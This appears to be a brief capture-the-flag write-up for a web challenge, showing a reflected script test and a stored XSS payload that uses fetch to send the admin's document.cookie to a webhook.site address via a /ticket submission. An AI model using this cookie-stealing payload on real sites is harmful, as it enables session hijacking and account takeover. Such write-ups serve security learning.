# Baby web
Web with xss
We see that literally putting in shit like:
```html
<script>alert(1)</script>
```
already runs the script; there is no sanitization, so we just need to steal cookie and ship it off the `/ticket` for the admin to get fucked:
```html
<script>fetch("https://webhook.site/blahblah?cookie="+document.cookie,{'mode':'no-cors'})</script>
```
get cookie in https://webhook.site

Hoot
